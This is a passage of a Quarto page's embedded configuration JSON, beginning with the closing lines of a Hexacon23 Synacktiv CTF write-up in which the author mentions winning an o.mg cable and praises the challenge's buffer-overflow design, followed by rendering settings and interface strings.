to win the first prize, but we were fast enough to win the second prize, a very cool [o.mg.lol](https://o.mg.lol/) cable!\nGreat challenge, very creative way of triggering and using a buffer overflow!\n\n![o.mg cable](omg-cable.webp){#fig-prize width=50%}\n"},"formats":{"html":{"identifier":{"display-name":"HTML","target-format":"html","base-format":"html"},"execute":{"fig-width":7,"fig-height":5,"fig-format":"retina","fig-dpi":96,"df-print":"default","error":false,"eval":true,"cache":null,"freeze":false,"echo":true,"output":true,"warning":true,"include":true,"keep-md":false,"keep-ipynb":false,"ipynb":null,"enabled":null,"daemon":null,"daemon-restart":false,"debug":false,"ipynb-filters":[],"engine":"markdown"},"render":{"keep-tex":false,"keep-source":false,"keep-hidden":false,"prefer-html":false,"output-divs":true,"output-ext":"html","fig-align":"default","fig-pos":null,"fig-env":null,"code-fold":"none","code-overflow":"scroll","code-link":false,"code-line-numbers":false,"code-tools":false,"tbl-colwidths":"auto","merge-includes":true,"inline-includes":false,"preserve-yaml":false,"latex-auto-mk":true,"latex-auto-install":true,"latex-clean":true,"latex-max-runs":10,"latex-makeindex":"makeindex","latex-makeindex-opts":[],"latex-tlmgr-opts":[],"latex-input-paths":[],"latex-output-dir":null,"link-external-icon":false,"link-external-newwindow":false,"self-contained-math":false,"format-resources":[],"notebook-links":true,"format-links":true},"pandoc":{"standalone":true,"wrap":"none","default-image-extension":"png","to":"html","css":["../../styles.css"],"toc":true,"output-file":"hexacon23.html"},"language":{"toc-title-document":"Table of contents","toc-title-website":"On this page","related-formats-title":"Other Formats","related-notebooks-title":"Notebooks","source-notebooks-prefix":"Source","section-title-abstract":"Abstract","section-title-appendices":"Appendices","section-title-footnotes":"Footnotes","section-title-references":"References","section-title-reuse":"Reuse","section-title-copyright":"Copyright","section-title-citation":"Citation","appendix-attribution-cite-as":"For attribution, please cite this work as:","appendix-attribution-bibtex":"BibTeX citation:","title-block-author-single":"Author","title-block-author-plural":"Authors","title-block-affiliation-single":"Affiliation","title-block-affiliation-plural":"Affiliations","title-block-published":"Published","title-block-modified":"Modified","callout-tip-title":"Tip","callout-note-title":"Note","callout-warning-title":"Warning","callout-important-title":"Important","callout-caution-title":"Caution","code-summary":"Code","code-tools-menu-caption":"Code","code-tools-show-all-code":"Show All Code","code-tools-hide-all-code":"Hide All Code","code-tools-view-source":"View Source","code-tools-source-code":"Source Code","code-line":"Line","code-lines":"Lines","copy-button-tooltip":"Copy to Clipboard","copy-button-tooltip-success":"Copied!","repo-action-links-edit":"Edit this page","repo-action-links-source":"View source","repo-action-links-issue":"Report an issue","back-to-top":"Back to top","search-no-results-text":"No results","search-matching-documents-text":"matching documents","search-copy-link-title":"Copy link to search","search-hide-matches-text":"Hide additional matches","search-more-match-text":"more match in this document","search-more-matches-text":"more matches in this document","search-clear-button-title":"Clear","search-detached-cancel-button-title":"Cancel","search-submit-button-title":"Submit","search-label":"Search","toggle-section":"Toggle section","toggle-sidebar":"Toggle sidebar navigation","toggle-dark-mode":"Toggle dark mode","toggle-reader-mode":"Toggle reader mode","toggle-navigation":"Toggle navigation","crossref-fig-title":"Figure","crossref-tbl-title":"Table","crossref-lst-title":"Listing","crossref-thm-title":"Theorem","crossref-lem-title":"Lemma","crossref-cor-title":"Corollary","crossref-prp-title":"Proposition","crossref-cnj-title":"Conjecture","crossref-def-title":"Definition","crossref-exm-title":"Example","crossref-exr-title":"Exercise","crossref-ch-prefix":"Chapter","crossref-apx-prefix":"Appendix","crossref-sec-prefix":"Section","crossref-eq-prefix":"Equation","crossref-lof-title":"List of Figures","crossref-lot-title":"List of Tables","crossref-lol-title":"List of Listings","environment-proof-title":"Proof","environment-remark-title":"Remark","environment-solution-title":"Solution","listing-page-order-by":"Order By","listing-page-order-by-default":"Default","listing-page-order-by-date-asc":"Oldest","listing-page-order-by-date-desc":"Newest","listing-page-order-by-number-desc":"High to Low","listing-page-order-by-number-asc":"Low to High","listing-page-field-date":"Date","listing-page-field-title":"Title","listing-page-field-description":"Description","listing-page-field-author":"Author","listing-page-field-filename":"File Name","listing-page-field-filemodified":"Modified","listing-page-field-subtitle":"Subtitle","listing-page-field-readingtime":"Reading Time","listing-page-field-categories":"Categories","listing-page-minutes-compact":"{0} min","listing-page-category-all":"All","listing-page-no-matches":"No matching items"},"metadata":{"lang":"en","fig-responsive":true,"quarto-version":"1.3.450","theme":["darkly"],"title":"Hexacon23 Synacktiv CTF","date":"2023-10-25"},"extensions":{"book":{"multiFile":true}}}},"projectFormats":["html"]}